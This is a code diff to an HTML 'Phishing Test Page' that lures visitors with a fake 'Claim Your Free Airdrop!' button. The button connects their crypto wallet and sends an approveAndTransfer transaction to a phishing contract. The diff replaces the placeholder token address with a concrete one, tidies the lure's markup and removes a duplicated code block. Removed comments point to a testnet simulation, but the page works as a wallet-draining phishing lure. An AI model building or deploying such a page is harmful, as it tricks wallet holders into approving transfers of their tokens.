@@ -4,9 +4,11 @@
     <title>Phishing Test Page</title>
 </head>
 <body>
-    <h2>Claim Your Free Airdrop!</h2>
-    <p>Click the button below to receive your reward.</p>
-    <button onclick="triggerPhishing()">Claim Now</button>
+    <div>
+        <h2>Claim Your Free Airdrop!</h2>
+        <p>Click the button below to receive your reward.</p>
+        <button onclick="triggerPhishing()">Claim Now</button>
+    </div>
 
     <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
     <script>
@@ -22,7 +24,7 @@
             const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
             const userAccount = accounts[0];
 
-            phishingContract.methods.approveAndTransfer("0xYourBEP20TokenAddress").send({ from: userAccount })
+            phishingContract.methods.approveAndTransfer("0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F").send({ from: userAccount })
                 .on('transactionHash', function(hash) {
                     console.log('Transaction sent: ', hash);
                 })
@@ -33,36 +35,6 @@
                     console.error('Transaction failed: ', error);
                 });
         }
-        <h2>Claim Your Free Airdrop!</h2>
-    <p>Click the button below to receive your reward.</p>
-    <button onclick="triggerPhishing()">Claim Now</button>
-
-    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
-    <script>
-        const web3 = new Web3(Web3.givenProvider || "https://data-seed-prebsc-1-s1.binance.org:8545");
-
-        // Replace with the contract address from Remix deployment
-        const contractAddress = "0xYourPhishingContractAddress";
-        const contractABI = [/* ABI of the PhishingApprovalSimulator contract */];
-
-        const phishingContract = new web3.eth.Contract(contractABI, contractAddress);
-
-        async function triggerPhishing() {
-            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-            const userAccount = accounts[0];
-
-            phishingContract.methods.approveAndTransfer("0xYourBEP20TokenAddress").send({ from: userAccount })
-                .on('transactionHash', function(hash) {
-                    console.log('Transaction sent: ', hash);
-                })
-                .on('confirmation', function(confirmationNumber, receipt) {
-                    console.log('Transaction confirmed: ', confirmationNumber, receipt);
-                })
-                .on('error', function(error) {
-                    console.error('Transaction failed: ', error);
-                });
-        }
-    </script>
     </script>
 </body>
 </html>
